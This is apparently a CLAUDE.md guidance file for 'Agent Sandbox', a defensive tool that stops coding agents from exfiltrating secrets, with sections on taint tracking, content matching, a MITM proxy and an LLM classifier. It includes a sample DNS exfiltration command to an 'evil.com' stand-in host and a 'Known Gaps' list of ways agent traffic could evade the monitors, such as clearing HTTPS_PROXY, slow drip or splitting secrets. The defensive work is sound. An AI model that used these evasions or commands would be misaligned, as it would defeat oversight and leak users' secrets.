# CLAUDE.md — Agent Sandbox

## What This Is

A security enforcement layer for LLM-powered coding agents. Prevents agents from
exfiltrating secrets, destroying files, or pivoting to external services. Works by
combining taint tracking, content matching, anomaly detection, HTTPS interception,
and optional LLM-based classification.

**Zero external dependencies** for the core runtime. Python 3.11+ stdlib only.

## Commands

```bash
pip install -e ".[dev]"         # install editable + dev deps
pytest                          # run all 179 tests (~12s)
pytest tests/test_lsh.py        # run one test file
pytest -k "test_exfil"          # run tests matching pattern
ruff check src/ tests/          # lint
ruff format src/ tests/         # format
```

CLI:
```bash
agent-sandbox --project /path/to/project -- python agent.py
agent-sandbox --project . --no-scan -- bash        # blind mode (no pre-scan)
agent-sandbox --project . --no-proxy -- bash       # disable MITM proxy
```

E2E experiment:
```bash
python -m agent_sandbox.experiments.e2e_runner
python -m agent_sandbox.experiments.e2e_runner --with-classifier  # requires anthropic
python -m agent_sandbox.experiments.simulated_adversary
python -m agent_sandbox.attacks.run_all
```

## Architecture

`sandbox.py` is the orchestrator. It composes primitives from `core/` — no
duplication. `core/` holds taint tracking, LSH, anomaly detection, policy, and
classification. `proxy/` handles HTTPS interception with MCP awareness.

```
scan project → ScanManifest → Sandbox(manifest) → start MITM proxy → launch agent
                                    │                    │
                          core/taint.TaintTracker   intercept every HTTP/HTTPS request
                          core/lsh.LSHEngine              │
                          core/anomaly.AnomalyDetector    ├─ generic: taint → host → LSH → anomaly
                          core/policy.PolicyEngine        └─ MCP-aware: detect tools/call JSON-RPC
                                                               extract tool + args, check_exec for shell
                                                               │
                                                         ALLOW or 403 DENY
```

### Enforcement layers (checked in order)

1. **Taint tracking** — Has the agent read sensitive files? Monotonic: once tainted,
   always tainted. Per-PID with parent→child inheritance. (`core/taint.py`)
2. **Host allowlist** — Tainted process + unknown host = always DENY. Allowlisted:
   github.com, pypi.org, npmjs.org, etc. (`core/policy.py:DEFAULT_ALLOWED_HOSTS`)
3. **LSH content matching** — Detects secrets even after base64/hex/URL encoding.
   Three-stage: trigram bloom pre-check → MinHash LSH → combined scoring
   (SimHash × 0.25 + MinHash × 0.40 + Bloom × 0.35). (`core/lsh.py`)
4. **Anomaly detection** — Catches evasion: rate bursts (>30 req/host), repeated
   shapes (chunked exfil), accumulated small requests. (`core/anomaly.py`)
5. **MITM proxy** — Terminates TLS, reads plaintext, passes body through layers
   1-4. MCP-aware: detects `tools/call` JSON-RPC in request bodies, runs
   `check_exec` for shell tools. (`proxy/mitm.py`, `proxy/cert.py`)
6. **LLM classifier** (optional) — Claude-based risk assessment for turns the
   regex pre-filter flags as SUSPICIOUS. Two-tier: free regex → paid LLM.
   Caches judgments for future model distillation. (`core/llm_classifier.py`)

### Key decision: `Sandbox.check_send(host, body) → (allowed, reason)`

```
not tainted?         → ALLOW
host not allowlisted → DENY
LSH matches body?    → DENY
anomaly detected?    → DENY
else                 → ALLOW
```

### Sandbox class delegates to core/

```python
class Sandbox:
    """Orchestrates core/ primitives. No duplicate logic."""
    _tracker: TaintTracker         # core/taint.py
    lsh: LSHEngine                 # core/lsh.py
    _anomaly: AnomalyDetector      # core/anomaly.py
    policy: PolicyEngine           # core/policy.py
    taint: TaintState              # compatibility wrapper (taint.tainted, taint.taint())
```

`TaintState` is a thin wrapper around `TaintTracker` that exposes the
`.tainted` bool and `.taint(source)` method for backward compatibility.
Under the hood it delegates to `TaintTracker.is_process_tainted(pid)`.

## Package Layout

```
src/agent_sandbox/
├── sandbox.py              # Sandbox class (orchestrator) + CLI entrypoint
├── env_scanner.py          # Pre-scan project for secrets/PII/infrastructure
├── call_summarizer.py      # Auto-summarize LLM tool calls → timeline + JSONL
├── trace_analyzer.py       # Behavioral analysis of LLM reasoning traces
├── doc_scanner.py          # Document content classification
├── e2e_test.py             # Strace-based syscall parser + enforcement
├── core/
│   ├── taint.py            # TaintLabel (Flag enum), TaintTracker (per-PID)
│   ├── lsh.py              # LSHEngine: trigram + simhash + minhash + variants
│   ├── anomaly.py          # AnomalyDetector: rate + shape + accumulator
│   ├── classifier.py       # classify(path, content) → TaintLabel
│   ├── policy.py           # PolicyEngine: combines all signals → Decision
│   └── llm_classifier.py   # LLMClassifier: Claude-based risk assessment (optional)
├── proxy/
│   ├── cert.py             # CertAuthority: CA generation + per-host signing
│   ├── mitm.py             # MITMProxy: CONNECT tunnels, TLS, MCP-aware inspection
│   └── inspector.py        # ProxyInspector: standalone content checker
├── attacks/
│   ├── disruption.py       # 8 disruption scenarios (rm -rf, fork bomb, etc.)
│   ├── disclosure.py       # 11 disclosure scenarios (exfil vectors)
│   └── run_all.py          # Run all 19 attacks + report
└── experiments/
    ├── simulated_adversary.py  # 5 adversary skill levels
    ├── llm_adversarial.py      # LLM-driven red team scaffolding
    └── e2e_runner.py           # Full pipeline: scan → attacks → adversary → report

tests/
├── conftest.py             # Shared fixtures
├── test_taint.py           # 12 tests: labels, inheritance, propagation
├── test_lsh.py             # 22 tests: trigram, simhash, minhash, variants
├── test_integration.py     # 40 tests: disruption, disclosure, classifier, sandbox
├── test_proxy_inspector.py # 22 tests: content inspection, all exfil vectors
├── test_e2e.py             # 15 tests: strace parser, scanner, pipeline
├── test_mitm_e2e.py        # 12 tests: CA certs, real TLS, subprocess proxy
├── test_call_summarizer.py # 43 tests: intent, classification, timeline, JSONL
├── test_llm_classifier.py  # 11 tests: parse, prompt build, assess (mocked)
└── test_e2e_runner.py      # 2 tests: full pipeline integration
```

## Key Conventions

- **All imports**: `from agent_sandbox.X import Y` — no sys.path hacks
- **Taint is monotonic**: once tainted, always tainted. Never clear taint.
- **Allowlist > blocklist**: unknown hosts blocked for tainted processes
- **Variants pre-indexed**: base64, hex, URL-encoded versions of each secret are
  indexed at scan time, not checked at runtime
- **core/ holds primitives, sandbox.py orchestrates**: no logic duplication
- **MCP interception via MITM proxy**: remote MCP servers are intercepted by the
  same proxy that handles all HTTPS. No separate MCP proxy needed. Local MCP
  servers (stdio) are trusted and not intercepted.

## Style

Python 3.11+. Type hints everywhere. `from __future__ import annotations` in every file.
Frozen dataclasses for value objects. Small functions (<40 lines). f-strings. No classes
when a function will do. Catch specific exceptions. Google Python Style Guide.

## Git Commits

- **Never add `Co-Authored-By` trailers.**
- Subject line: `feat:`, `fix:`, `docs:`, `test:`, `refactor:`

## What to Work on Next

### Priority 1: eBPF migration

Replace strace-based syscall monitoring with eBPF probes for lower overhead:
- Tetragon for Kubernetes environments (detection + enforcement)
- Falco for general Linux (detection, flexible rules)
- Both achieve 100% detection, 0 false positives in benchmarks

### Priority 2: DNS exfiltration detection

The MITM proxy catches HTTP/HTTPS but not DNS. An agent could exfil via
`dig AKIA1234.evil.com`. Options:
- Monitor `/etc/resolv.conf` and intercept DNS queries
- Use network namespace + iptables to force DNS through a local resolver
- Parse DNS queries for high-entropy subdomain labels

### Priority 3: LLM classifier dataset generation

The `LLMClassifier` caches every assessment as a training pair. Next steps:
1. Run real agent sessions through the sandbox with the classifier enabled
2. Export JSONL dataset via `classifier.export_dataset()`
3. Fine-tune a smaller model (ModernBERT-base or DeBERTa-v3) on the data
4. Replace Claude with the local model for cost-free runtime classification

### Known Gaps

1. **Very short secrets** (< 10 chars) may not trigger LSH per-line check
2. **Custom ciphers** (ROT13, XOR, AES) are not detectable by LSH
3. **Very slow drip** (1 byte/minute over hours) may evade rate + accumulator
4. **Steganography** (secret in image pixels) is not inspected
5. **DNS exfil** not intercepted (see Priority 2)
6. **Proxy bypass** — agent could clear `HTTPS_PROXY` env var. Mitigation:
   network namespace + iptables to force all traffic through proxy
7. **Per-line dilution** — splitting secrets across many small lines can evade
   the LSH per-line check (1 known escaped attack in the test suite)

## Testing

Always run `pytest` before committing. All 179 tests must pass. When adding a new
detection strategy, also add an attack scenario in `attacks/` and a test that
verifies the attack is blocked.

Test pattern:
```python
class TestNewFeature:
    def test_attack_blocked(self):
        # Set up sandbox with secrets
        # Simulate attack
        # Assert blocked

    def test_normal_use_allowed(self):
        # Set up sandbox
        # Simulate normal agent work
        # Assert not blocked (zero false positives)
```

## Dependencies

**Core (zero external deps):**
- Python 3.11+ stdlib: ssl, socket, threading, http.server, subprocess, hashlib, re
- openssl CLI (for cert generation)

**Dev:**
- pytest >= 8.0
- ruff >= 0.4

**Optional (for LLM classifier):**
- anthropic >= 0.40 — `pip install agent-sandbox[llm]`
